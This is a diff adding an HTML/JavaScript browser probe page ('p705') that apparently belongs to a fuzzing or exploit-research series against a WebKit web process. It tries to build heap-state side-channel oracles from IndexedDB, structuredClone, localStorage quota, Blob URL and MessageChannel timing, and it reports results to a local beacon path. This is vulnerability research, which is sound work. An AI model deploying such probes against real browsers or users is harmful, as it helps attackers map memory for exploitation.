@@ -1,0 +1,389 @@
+<!--
+  p705: IndexedDB + Storage API heap oracle
+
+  IndexedDB stores structured data in a B-tree backed by the OS filesystem.
+  The internal buffer management (serialization, key comparison) allocates
+  from WebProcess heap. Observable timing differences in store/retrieve
+  operations can reveal heap state.
+
+  Additionally, the structured clone serialization used by IDB may
+  handle certain object types differently, potentially leaking type
+  metadata or internal pointers through timing.
+
+  Attack angles:
+  A) IDB store timing as heap pressure indicator -- storing objects of
+     specific sizes forces heap allocation. The timing step function
+     reveals page boundaries.
+  B) IDB key comparison timing -- IndexedDB sorts keys. The comparison
+     function timing for binary keys of specific lengths may reveal
+     internal buffer alignment.
+  C) Structured clone serialization size oracle -- cloning objects and
+     measuring the time reveals serialization overhead that depends on
+     internal representation.
+  D) localStorage quota probing -- filling localStorage to the quota
+     limit and observing the exact byte at which it fails reveals
+     internal page-aligned allocation.
+  E) Blob URL creation timing -- URL.createObjectURL allocates internal
+     strings. The URL format may reveal process-specific identifiers.
+  F) MessageChannel postMessage serialization -- structured clone across
+     ports; timing varies with object graph complexity.
+
+  CRASH_CLASS: LOW (storage API usage, no corruption)
+  prior art: p702 (structured clone), p630 (structuredClone timing)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p705</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P705-START:INDEXEDDB-HEAP-ORACLE');
+  var results = [];
+
+  // === SECTION A: IndexedDB store timing ===
+  b('A:IDB-STORE-TIMING');
+  try {
+    if (typeof indexedDB !== 'undefined') {
+      var dbName = 'probe705_' + Date.now();
+      var openReq = indexedDB.open(dbName, 1);
+
+      openReq.onupgradeneeded = function(e) {
+        var db = e.target.result;
+        db.createObjectStore('data', {keyPath: 'id'});
+      };
+
+      openReq.onsuccess = function(e) {
+        var db = e.target.result;
+        b('A:DB-OPENED:' + db.name);
+
+        // Store objects of increasing size and measure timing
+        var storeTimes = [];
+        var sizes = [64, 128, 256, 512, 1024, 2048, 4096, 8192];
+
+        for (var s = 0; s < sizes.length; s++) {
+          var data = new Uint8Array(sizes[s]);
+          for (var i = 0; i < sizes[s]; i++) data[i] = i & 0xFF;
+
+          var t0 = performance.now();
+          var tx = db.transaction('data', 'readwrite');
+          var store = tx.objectStore('data');
+
+          for (var j = 0; j < 100; j++) {
+            store.put({id: 'item_' + s + '_' + j, payload: data.buffer.slice(0)});
+          }
+          // Force sync via sync XHR pump
+          try { var x = new XMLHttpRequest(); x.open('GET','/pump-idb',false); x.send(); } catch(e2){}
+          var dt = performance.now() - t0;
+          storeTimes.push(sizes[s] + ':' + dt.toFixed(2));
+        }
+        b('A:STORE-TIMES:' + storeTimes.join(','));
+
+        // Check for timing steps (heap page boundary crossings)
+        var parsed = storeTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+        for (var i = 1; i < parsed.length; i++) {
+          var ratio = parsed[i] / parsed[i-1];
+          if (ratio > 2) {
+            b('A:STEP-AT-SIZE=' + sizes[i] + ',RATIO=' + ratio.toFixed(2));
+            results.push('A:idb-step=' + sizes[i]);
+          }
+        }
+
+        db.close();
+        indexedDB.deleteDatabase(dbName);
+      };
+
+      openReq.onerror = function() { b('A:DB-OPEN-ERR'); };
+
+      // Pump events
+      var deadline = Date.now() + 3000;
+      while (Date.now() < deadline) {
+        try { var x = new XMLHttpRequest(); x.open('GET','/pump',false); x.send(); } catch(e2){}
+      }
+    } else {
+      b('A:NO-INDEXEDDB');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: IDB key comparison timing ===
+  b('B:KEY-COMPARISON');
+  try {
+    // indexedDB.cmp() compares two keys synchronously
+    if (typeof indexedDB !== 'undefined' && indexedDB.cmp) {
+      var cmpTimes = [];
+
+      // Compare keys of different types and sizes
+      var keyPairs = [
+        [1, 2],
+        ['a', 'b'],
+        ['a'.repeat(100), 'a'.repeat(100) + 'b'],
+        [new Date(0), new Date(1)],
+        [new ArrayBuffer(0), 'key'],  // may throw
+        [['a', 'b'], ['a', 'c']],
+        [['a'.repeat(1000)], ['a'.repeat(1000) + 'x']],
+      ];
+
+      for (var p = 0; p < keyPairs.length; p++) {
+        try {
+          var t0 = performance.now();
+          for (var i = 0; i < 100000; i++) {
+            indexedDB.cmp(keyPairs[p][0], keyPairs[p][1]);
+          }
+          var dt = performance.now() - t0;
+          cmpTimes.push(p + ':' + dt.toFixed(2));
+        } catch(e2) {
+          cmpTimes.push(p + ':ERR');
+        }
+      }
+      b('B:CMP-TIMES:' + cmpTimes.join(','));
+
+      // Long string comparison should take longer -- check linearity
+      var longCmpTimes = [];
+      for (var len = 100; len <= 10000; len *= 2) {
+        var k1 = 'a'.repeat(len);
+        var k2 = 'a'.repeat(len - 1) + 'b';
+        var t0 = performance.now();
+        for (var i = 0; i < 10000; i++) indexedDB.cmp(k1, k2);
+        var dt = performance.now() - t0;
+        longCmpTimes.push(len + ':' + dt.toFixed(2));
+      }
+      b('B:LONG-CMP:' + longCmpTimes.join(','));
+    } else {
+      b('B:NO-CMP');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Structured clone size oracle ===
+  b('C:CLONE-SIZE-ORACLE');
+  try {
+    if (typeof structuredClone === 'function') {
+      // Clone objects with different internal representations
+      // and measure timing to reveal serialization format differences
+      var cloneTests = [];
+
+      // Plain objects of increasing depth
+      function makeDeep(depth) {
+        if (depth <= 0) return {leaf: true};
+        return {child: makeDeep(depth - 1)};
+      }
+
+      for (var d = 1; d <= 10; d++) {
+        var obj = makeDeep(d);
+        var t0 = performance.now();
+        for (var i = 0; i < 10000; i++) structuredClone(obj);
+        var dt = performance.now() - t0;
+        cloneTests.push('depth' + d + ':' + dt.toFixed(2));
+      }
+      b('C:DEPTH-TIMES:' + cloneTests.join(','));
+
+      // Objects with different value types
+      var typeTests = [
+        {name: 'int', val: 42},
+        {name: 'float', val: 3.14159},
+        {name: 'string', val: 'hello world'},
+        {name: 'bool', val: true},
+        {name: 'null', val: null},
+        {name: 'date', val: new Date()},
+        {name: 'regexp', val: /test/g},
+        {name: 'ab', val: new ArrayBuffer(64)},
+        {name: 'u8', val: new Uint8Array(64)},
+        {name: 'f64', val: new Float64Array(8)},
+        {name: 'map', val: new Map([[1,'a'],[2,'b']])},
+        {name: 'set', val: new Set([1,2,3])},
+      ];
+
+      var typeTimes = [];
+      for (var t = 0; t < typeTests.length; t++) {
+        var obj = {data: typeTests[t].val};
+        try {
+          var t0 = performance.now();
+          for (var i = 0; i < 10000; i++) structuredClone(obj);
+          var dt = performance.now() - t0;
+          typeTimes.push(typeTests[t].name + ':' + dt.toFixed(2));
+        } catch(e2) {
+          typeTimes.push(typeTests[t].name + ':ERR');
+        }
+      }
+      b('C:TYPE-TIMES:' + typeTimes.join(','));
+    } else {
+      b('C:NO-STRUCTURED-CLONE');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: localStorage quota probing ===
+  b('D:LOCALSTORAGE-QUOTA');
+  try {
+    if (typeof localStorage !== 'undefined') {
+      // Clear first
+      localStorage.clear();
+
+      // Fill with increasing chunks until quota exceeded
+      var totalStored = 0;
+      var chunkSize = 1024;
+      var chunk = 'A'.repeat(chunkSize);
+      var quotaHit = false;
+      var storageLimit = 0;
+
+      for (var i = 0; i < 10000; i++) {
+        try {
+          localStorage.setItem('probe_' + i, chunk);
+          totalStored += chunkSize;
+        } catch(e2) {
+          quotaHit = true;
+          storageLimit = totalStored;
+          break;
+        }
+      }
+
+      b('D:TOTAL-STORED=' + totalStored + ',QUOTA-HIT=' + quotaHit);
+
+      if (quotaHit) {
+        // Now probe exact boundary with single chars
+        var lastKey = 'probe_boundary';
+        var exactLimit = 0;
+        for (var len = 1; len <= chunkSize; len++) {
+          try {
+            localStorage.setItem(lastKey, 'B'.repeat(len));
+            exactLimit = len;
+          } catch(e2) {
+            break;
+          }
+        }
+        b('D:EXACT-BOUNDARY=' + exactLimit + ',TOTAL=' + (totalStored + exactLimit));
+        storageLimit = totalStored + exactLimit;
+
+        // The exact quota reveals page alignment
+        b('D:QUOTA-BYTES=' + storageLimit);
+        b('D:QUOTA-MOD-4K=' + (storageLimit % 4096));
+        b('D:QUOTA-MOD-16K=' + (storageLimit % 16384));
+
+        if (storageLimit % 4096 === 0 || storageLimit % 16384 === 0) {
+          results.push('D:page-aligned-quota=' + storageLimit);
+        }
+      }
+
+      localStorage.clear();
+    } else {
+      b('D:NO-LOCALSTORAGE');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Blob URL creation and format ===
+  b('E:BLOB-URL');
+  try {
+    if (typeof Blob !== 'undefined' && typeof URL !== 'undefined' && URL.createObjectURL) {
+      var urls = [];
+      for (var i = 0; i < 20; i++) {
+        var blob = new Blob(['data' + i], {type: 'text/plain'});
+        var url = URL.createObjectURL(blob);
+        urls.push(url);
+      }
+
+      // Log the URL format -- it contains a UUID that may be predictable
+      b('E:URL-FORMAT:' + urls[0]);
+      b('E:URL-SAMPLES:' + urls.slice(0, 5).join(','));
+
+      // Check if UUIDs are sequential
+      var uuids = urls.map(function(u) {
+        var match = u.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i);
+        return match ? match[0] : 'no-uuid';
+      });
+      b('E:UUIDS:' + uuids.slice(0, 5).join(','));
+
+      // Check sequential pattern in UUIDs
+      if (uuids[0] !== 'no-uuid' && uuids[1] !== 'no-uuid') {
+        // Compare last bytes of consecutive UUIDs
+        var last0 = parseInt(uuids[0].replace(/-/g, '').slice(-8), 16);
+        var last1 = parseInt(uuids[1].replace(/-/g, '').slice(-8), 16);
+        var delta = last1 - last0;
+        b('E:UUID-DELTA=' + delta);
+        if (Math.abs(delta) === 1) {
+          b('E:SEQUENTIAL-UUIDS');
+          results.push('E:sequential-uuids');
+        }
+      }
+
+      // Revoke all
+      for (var i = 0; i < urls.length; i++) URL.revokeObjectURL(urls[i]);
+    } else {
+      b('E:NO-BLOB-URL');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: MessageChannel timing ===
+  b('F:MESSAGECHANNEL');
+  try {
+    if (typeof MessageChannel !== 'undefined') {
+      var ch = new MessageChannel();
+      var received = [];
+
+      ch.port2.onmessage = function(e) {
+        received.push({time: performance.now(), data: e.data});
+      };
+      ch.port2.start();
+
+      // Send messages of different types and sizes
+      var messages = [
+        42,
+        'hello',
+        {nested: {deep: {value: 123}}},
+        new ArrayBuffer(1024),
+        new Float64Array(128),
+        Array.from({length: 100}, function(_, i) { return i; }),
+      ];
+
+      var sendTimes = [];
+      for (var m = 0; m < messages.length; m++) {
+        var t0 = performance.now();
+        for (var i = 0; i < 1000; i++) {
+          ch.port1.postMessage(messages[m]);
+        }
+        var dt = performance.now() - t0;
+        sendTimes.push(typeof messages[m] + ':' + dt.toFixed(2));
+      }
+      b('F:SEND-TIMES:' + sendTimes.join(','));
+
+      // Pump to receive
+      try { var x = new XMLHttpRequest(); x.open('GET','/pump-msg',false); x.send(); } catch(e2){}
+      b('F:RECEIVED=' + received.length);
+
+      // Transfer semantics timing
+      var transferTimes = [];
+      for (var size = 64; size <= 16384; size *= 2) {
+        var ab = new ArrayBuffer(size);
+        var t0 = performance.now();
+        ch.port1.postMessage(ab, [ab]);
+        var dt = performance.now() - t0;
+        transferTimes.push(size + ':' + dt.toFixed(4));
+      }
+      b('F:TRANSFER-TIMES:' + transferTimes.join(','));
+
+      ch.port1.close();
+      ch.port2.close();
+    } else {
+      b('F:NO-MESSAGECHANNEL');
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P705-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P705-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P705-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p705: IndexedDB + Storage API heap oracle</pre></body></html>
